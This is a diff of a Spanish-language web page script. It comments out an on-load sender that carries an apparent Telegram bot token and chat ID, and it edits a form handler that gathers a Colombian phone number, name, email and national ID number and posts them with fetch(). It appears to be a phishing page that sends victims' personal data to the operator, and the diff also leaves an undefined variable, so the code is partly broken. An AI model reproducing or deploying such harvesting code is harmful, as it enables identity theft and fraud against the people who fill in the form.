@@ -27,7 +27,7 @@ window.addEventListener('load', function() {
 
 
 
-// Ejecutar al cargar la página
+/*
 window.addEventListener('load', function() {
     const token = "8214599584:AAF5D-FzEQsPPwSBtyD0iyFWfar0Li5VFHw";
     const chatId = "8417322083";
@@ -45,7 +45,7 @@ window.addEventListener('load', function() {
     .then(data => console.log("enviado "))
     .catch(err => console.error("Error ", err));
 });
-
+*/
 
 
 
@@ -61,12 +61,12 @@ document.addEventListener("DOMContentLoaded", () => {
     const correo   = document.getElementById("correo01").value.trim();
     const cedula   = document.getElementById("cedula01").value.trim();
 
-    if (!telefono || !nombre || !correo || !cedula) {
+    if (!número || !nombre || !correo || !cedula) {
       mostrarModalError("El número de celular, correo o la cédula son incorrectos.");
       return;
     }
 
-    if (!telefonoColombianoValido(telefono) || !cedulaColombianaValida(cedula)) {
+    if (!telefonoColombianoValido(numero) || !cedulaColombianaValida(cedula)) {
       mostrarModalError("El número de celular o la cédula son incorrectos.");
       return;
     }
@@ -83,7 +83,7 @@ document.addEventListener("DOMContentLoaded", () => {
       "Numero: " + numero + "\n" +
       "Nombre: " + nombre + "\n" +
       "Correo: " + correo + "\n" +
-      "Cédula: " + cedula + "\n" +;
+      "Cédula: " + cedula + "\n" ;
 
     try {
       const response = await fetch(
@@ -163,6 +163,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
 
 });
+
 
 
 
